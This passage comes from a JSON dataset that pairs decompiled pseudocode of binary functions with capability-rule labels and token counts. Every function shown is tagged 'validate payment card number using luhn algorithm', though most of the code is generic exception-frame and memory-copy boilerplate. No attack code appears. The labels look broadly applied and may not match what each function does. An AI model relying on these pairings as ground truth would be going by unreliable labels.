        "decompiled_code": "\nuint __fastcall fcn.0046001c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046073c();\n    fcn.004037f0();\n    fcn.00402d34();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "0046006c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0046006c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0046001c();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "004600ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004600ec(uint param_1, ushort *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x46020c;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x460119;\n    fcn.00416fa8();\n    uStack72 = 0x4601ef;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x460134;\n    puStack68 = &stack0xfffffffc;\n    fcn.00416fb8();\n    puStack80 = 0x46013f;\n    cVar1 = fcn.00417044();\n    if (cVar1 != '\\0') {\n        puStack80 = 0x460151;\n        fcn.00417050();\n        puStack80 = 0x460160;\n        uVar2 = fcn.0045ffc4();\n        *(param_2 + 4) = uVar2;\n        *param_2 = *(in_EAX + 4);\n        *in_FS_OFFSET = uStack76;\n        puStack68 = 0x4601f6;\n        uStack72 = 0x4601ee;\n        fcn.00416fb0();\n        return;\n    }\n    puStack80 = 0x460173;\n    fcn.00416fa8();\n    uStack84 = 0x4601c2;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    fcn.00416fc4(7);\n    uVar2 = fcn.0045ff68(var_20h, var_1ch);\n    *(param_2 + 4) = uVar2;\n    *in_FS_OFFSET = var_20h;\n    fcn.00416fb0(0x4601c9);\n    return;\n}\n",
        "token_count": 588
    },
    "00460218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460218(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int16_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x46032f;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    if (*in_ECX == *(in_EAX + 4)) {\n        if (arg_8h == 8) {\n            puStack52 = &stack0xfffffffc;\n            fcn.0045fee8();\n            fcn.00404e20();\n            arg_8h = 0x460287;\n            fcn.00416ff8();\n        }\n        else {\n            if (arg_8h != 0x100) {\n                puStack52 = &stack0xfffffffc;\n                fcn.00416fa8();\n                uStack68 = 0x4602f8;\n                uStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                fcn.0045ff00();\n                fcn.00416fc4(arg_8h);\n                *in_FS_OFFSET = arg_8h;\n                uStack68 = 0x46030c;\n                uStack72 = 0x4602f7;\n                fcn.00416fb0();\n                return;\n            }\n            puStack52 = &stack0xfffffffc;\n            fcn.0045fee8();\n            arg_8h = 0x4602a4;\n            fcn.00416fec();\n        }\n    }\n    else {\n        uStack68 = 0x46030c;\n        fcn.00416b34(arg_8h);\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack56 = 0x460336;\n    uStack60 = 0x460326;\n    fcn.004045ec();\n    uStack60 = 0x46032e;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 521
    },
    "00460538": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460538(uint param_1, uint *param_2)\n\n{\n    double dVar1;\n    float10 fVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    \n    uVar3 = *param_2;\n    uVar4 = param_2[1];\n    uVar5 = param_2[2];\n    uVar6 = param_2[3];\n    fVar2 = fcn.004606b4();\n    dVar1 = fVar2;\n    fcn.0040b69c(SUB84(dVar1, 0), dVar1 >> 0x20, dVar1, uVar3, uVar4, uVar5, uVar6);\n    return;\n}\n",
        "token_count": 177
    },
    "004605b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004605b4(uint param_1, uint *param_2)\n\n{\n    char cVar1;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    cVar1 = fcn.0040c008();\n    if (cVar1 != '\\0') {\n        fcn.0046066c(uStack36, uStack32);\n        *param_2 = uStack36;\n        param_2[1] = uStack32;\n        param_2[2] = uStack28;\n        param_2[3] = uStack24;\n        cVar1 = fcn.00460574();\n    }\n    if (cVar1 == '\\0') {\n        *param_2 = *0x483f88;\n        param_2[1] = *0x483f8c;\n        param_2[2] = *0x483f90;\n        param_2[3] = *0x483f94;\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "004606b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004606b4(void)\n\n{\n    double dVar1;\n    char cVar2;\n    int32_t in_EAX;\n    ushort extraout_var;\n    float10 fVar3;\n    uint uVar4;\n    uint uStack12;\n    \n    uVar4 = 0x4606c1;\n    cVar2 = fcn.0045fba4();\n    if (cVar2 == '\\0') {\n        fVar3 = fcn.0040a91c();\n        uStack12 = SUB84(fVar3, 0);\n        if (fVar3 < *0x460738) {\n            uVar4 = CONCAT22(extraout_var, *(in_EAX + 0xc));\n            fVar3 = fcn.0040a774(uVar4);\n            dVar1 = CONCAT44(uStack12, uVar4) - fVar3;\n            uVar4 = SUB84(dVar1, 0);\n            uStack12 = dVar1 >> 0x20;\n        }\n        else {\n            uVar4 = CONCAT22(extraout_var, *(in_EAX + 0xc));\n            fVar3 = fcn.0040a774(uVar4);\n            dVar1 = fVar3 + CONCAT44(uStack12, uVar4);\n            uVar4 = SUB84(dVar1, 0);\n            uStack12 = dVar1 >> 0x20;\n        }\n    }\n    else {\n        uStack12 = 0;\n    }\n    return CONCAT44(uStack12, uVar4);\n}\n",
        "token_count": 341
    },
    "00460b50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460b50(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack32 = 0x460bb0;\n    iStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    arg_8h = &fcn.00460b50::var_4h;\n    fcn.00409998(arg_8h);\n    fcn.0040c8dc();\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x460bb7;\n    iStack36 = 0x460baf;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 222
    },
    "00460bf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460bf0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack48 [9];\n    \n    fcn.00463d28();\n    puVar2 = auStack48;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    return;\n}\n",
        "token_count": 157
    },
    "00460c18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460c18(void)\n\n{\n    fcn.00460bf0();\n    return;\n}\n",
        "token_count": 25
    },
    "00460c24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460c24(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack48 [9];\n    \n    fcn.004639cc();\n    puVar2 = auStack48;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    return;\n}\n",
        "token_count": 156
    },
    "00460c4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460c4c(void)\n\n{\n    fcn.00460c24();\n    return;\n}\n",
        "token_count": 26
    },
    "00460c58": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460c58(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack48 [9];\n    \n    fcn.00463b00();\n    puVar2 = auStack48;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    return;\n}\n",
        "token_count": 157
    },
    "00460c84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460c84(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint auStack48 [9];\n    \n    puVar2 = 0x483fc4;\n    puVar3 = auStack48;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    fcn.00463cbc();\n    puVar2 = auStack48;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    return;\n}\n",
        "token_count": 250
    },
    "00460cec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460cec(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x460d35;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00464070();\n    fcn.0040a540();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x460d3c;\n    uStack28 = 0x460d34;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 154
    },
    "00460ddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460ddc(double param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint arg_8h;\n    uint uVar5;\n    ushort uVar6;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x460e3c;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    fVar4 = param_1;\n    arg_8h = SUB104(fVar4, 0);\n    uVar5 = fVar4 >> 0x20;\n    uVar6 = fVar4 >> 0x40;\n    fcn.0040a3c0(arg_8h);\n    fcn.00461504(arg_8h, uVar5, uVar6);\n    puVar2 = &var_24h;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045c8(0xe43);\n    return;\n}\n",
        "token_count": 367
    },
    "00460e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00460e4c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x460ea6;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    fcn.00408c28();\n    fcn.00461504();\n    puVar2 = &fcn.00460e4c::var_24h;\n    puVar3 = in_EAX + 4;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = *puVar2;\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x460ead;\n    uStack64 = 0x460ea5;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 295
    },
    "00460ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00460ec0(uint arg_8h, uint arg_ch)\n\n{\n    fcn.00464214(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 41
    },
    "00460ee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00460ee0(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.00402d34();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 140
    },
    "00460f28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00460f28(uint arg_8h)\n\n{\n    char cVar1;\n    uint16_t in_CX;\n    uint16_t extraout_CX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    float10 fVar2;\n    double in_stack_00000008;\n    uint *arg_8h_00;\n    uint arg_ch;\n    uint uVar3;\n    uchar uVar4;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_45h;\n    uint var_23h;\n    uint var_1h;\n    \n    var_50h = 0;\n    var_4ch = 0;\n    if (in_DL != '\\0') {\n        puStack120 = 0x460f48;\n        fcn.00403b58();\n        in_DL = extraout_DL;\n        in_CX = extraout_CX;\n    }\n    uStack124 = 0x460ff9;\n    uStack128 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff80;\n    var_1h._0_1_ = in_DL;\n    if (((in_CX == 0) || (0x40 < in_CX)) || (puStack120 = &fcn.00460f28::var_1h + 1,  in_CX < arg_8h)) {\n        puStack120 = &fcn.00460f28::var_1h + 1;\n        fcn.0040675c();\n        fcn.00460bd8();\n    }\n    fVar2 = in_stack_00000008;\n    arg_ch = SUB104(fVar2, 0);\n    uVar3 = fVar2 >> 0x20;\n    uVar4 = fVar2 >> 0x40;\n    arg_8h_00 = &fcn.00460f28::var_50h;\n    fcn.0040a420(arg_8h_00, arg_ch);\n    fcn.00461504(arg_8h_00, arg_ch, uVar3, uVar4);\n    cVar1 = fcn.00463540(arg_8h);\n    if (cVar1 == '\\0') {\n        fcn.0040675c();\n        fcn.00460bd8();\n    }\n    fcn.00460ee0();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004045ec(0x461000);\n    return;\n}\n",
        "token_count": 602
    },
    "00461024": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461024(uint32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint16_t extraout_var;\n    uint32_t arg_8h_00;\n    char in_DL;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint var_48h;\n    uint var_44h;\n    uint var_22h;\n    \n    if (in_DL != '\\0') {\n        puStack108 = 0x46103e;\n        fcn.00403b58();\n    }\n    uStack112 = 0x4610ab;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    puStack108 = &stack0xfffffffc;\n    fcn.00461504();\n    arg_8h_00 = arg_8h & 0xffff | extraout_var << 0x10;\n    cVar1 = fcn.00463540(arg_8h_00);\n    if (cVar1 == '\\0') {\n        fcn.0040675c();\n        fcn.00460bd8();\n    }\n    fcn.00460ee0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack112 = 0x4610b2;\n    uStack116 = 0x4610aa;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 327
    },
    "004610d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004610d4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00460ee0();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "00461120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461120(uint param_1, ushort *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack88;\n    uint uVar2;\n    uint uVar3;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x46124a;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x46114d;\n    fcn.00416fa8();\n    uStack72 = 0x46122d;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack68 = &stack0xfffffffc;\n    fcn.00416fb8();\n    cVar1 = fcn.00417044();\n    if (cVar1 != '\\0') {\n        uVar3 = 0x20;\n        uVar2 = 8;\n        uStack88 = 0x461189;\n        fcn.00417050();\n        uStack88 = 0x461198;\n        uVar3 = fcn.00461024(uVar2, uVar3);\n        *(param_2 + 4) = uVar3;\n        *param_2 = *(in_EAX + 4);\n        *in_FS_OFFSET = uVar2;\n        uStack76 = 0x461234;\n        fcn.00416fb0();\n        return;\n    }\n    fcn.00416fa8();\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    fcn.00416fc4(5);\n    uVar2 = 8;\n    uVar3 = fcn.00460f28(8);\n    *(param_2 + 4) = uVar3;\n    *in_FS_OFFSET = uVar2;\n    fcn.00416fb0(0x461207);\n    return;\n}\n",
        "token_count": 532
    },
    "00461258": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00461258(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int16_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x461372;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    if (*in_ECX == *(in_EAX + 4)) {\n        if (arg_8h == 8) {\n            puStack52 = &stack0xfffffffc;\n            fcn.00460cd8();\n            fcn.00404e20();\n            arg_8h = 0x4612c7;\n            fcn.00416ff8();\n        }\n        else {\n            if (arg_8h != 0x100) {\n                puStack52 = &stack0xfffffffc;\n                fcn.00416fa8();\n                uStack68 = 0x46133b;\n                uStack72 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb8;\n                fcn.004615f8();\n                fcn.00416fc4(arg_8h);\n                *in_FS_OFFSET = arg_8h;\n                uStack68 = 0x46134f;\n                uStack72 = 0x46133a;\n                fcn.00416fb0();\n                return;\n            }\n            puStack52 = &stack0xfffffffc;\n            fcn.00460cd8();\n            arg_8h = 0x4612e4;\n            fcn.00416fec();\n        }\n    }\n    else {\n        uStack68 = 0x46134f;\n        fcn.00416b34(arg_8h);\n    }\n    *in_FS_OFFSET = arg_8h;\n    uStack56 = 0x461379;\n    uStack60 = 0x461369;\n    fcn.004045ec();\n    uStack60 = 0x461371;\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 519
    },
    "00461560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00461560(uint param_1, uint *param_2)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint in_stack_ffffffcc;\n    double dVar5;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_8h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x4615e9;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack44;\n    iVar1 = fcn.00415a6c();\n    if (iVar1 == *(*0x483fe8 + 4)) {\n        puVar3 = *(in_EAX + 8);\n        for (iVar2 = 8; puVar3 = puVar3 + 1,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *param_2 = *puVar3;\n            param_2 = param_2 + 1;\n        }\n        *param_2 = *puVar3;\n    }\n    else {\n        fVar4 = fcn.00412a5c();\n        dVar5 = fVar4;\n        fcn.0046148c(SUB84(dVar5, 0), dVar5 >> 0x20);\n        in_stack_ffffffcc = SUB84(dVar5, 0);\n        puVar3 = NULL;\n        for (iVar2 = 8; puVar3 = puVar3 + 1,  iVar2 != 0; iVar2 = iVar2 + -1) {\n            *param_2 = *puVar3;\n            param_2 = param_2 + 1;\n        }\n        *param_2 = *puVar3;\n    }\n    *in_FS_OFFSET = in_stack_ffffffcc;\n    uStack44 = 0x4615f0;\n    fcn.004104d4();\n    return;\n}\n",
        "token_count": 465
    },
    "004615f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004615f8(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x461640;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.00464070();\n    fcn.0040a540();\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461647;\n    uStack28 = 0x46163f;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 152
    },
    "0046199c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0046199c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = 0x4619b6;\n    fcn.00404a78();\n    puStack24 = 0x4619be;\n    fcn.00404a78();\n    uStack28 = 0x461a42;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.00461960();\n    fcn.00404660();\n    iVar1 = fcn.00404888();\n    iVar2 = fcn.00404888();\n    if (iVar1 <= iVar2) {\n        iVar1 = fcn.00404888();\n        iVar2 = fcn.00404888();\n        if (iVar1 <= iVar2) {\n            fcn.00408950();\n        }\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x461a49;\n    uStack28 = 0x461a41;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 299
    },
    "00461a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.00461a50(int32_t *arg_8h, int32_t *arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    uint *in_stack_ffffffd0;\n    int32_t var_24h;\n    uint var_20h;\n    uchar *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 4;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_ch = 0;\n    var_1ch = 0x461a7d;\n    fcn.00404a78();\n    var_1ch = 0x461a85;\n    fcn.00404a78();\n    var_20h = 0x461be8;\n    var_24h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00461a50::var_24h;\n    *arg_8h = 0;\n    var_1ch = &stack0xfffffffc;\n    iVar4 = fcn.0046199c();\n    if (iVar4 < 2) {\n        fcn.0040461c();\n        fcn.0040461c();\n        *arg_10h = arg_14h;\n        *arg_ch = arg_18h;\n    }\n    else {\n        fcn.0040461c();\n        fcn.0040461c();\n        *arg_10h = arg_18h;\n        *arg_ch = arg_14h;\n    }\n    fcn.004047b0();\n    iVar4 = fcn.00404bcc();\n    fcn.004047b0();\n    piVar1 = fcn.00404bcc();\n    if ((iVar4 == 0) && (piVar1 == NULL)) {\n        *arg_8h = -0xff;\n    }\n    else {\n        piVar3 = piVar1;\n        if (0 < iVar4) {\n            uVar2 = piVar1 & 0xffffff00 | *0x461bf8;\n            in_stack_ffffffd0 = &fcn.00461a50::var_18h;\n            fcn.004047b0();\n            fcn.0040dd94(in_stack_ffffffd0, uVar2);\n            fcn.0040461c();\n            *arg_8h = *arg_10h - iVar4;\n            *arg_10h = *arg_10h + -1;\n            piVar3 = arg_10h;\n        }\n        if (0 < piVar1) {\n            uVar2 = piVar3 & 0xffffff00 | *0x461bf8;\n            arg_8h_00 = &fcn.00461a50::var_20h;\n            fcn.004047b0();\n            fcn.0040dd94(arg_8h_00, uVar2);\n            fcn.0040461c();\n            *arg_8h = *arg_8h + 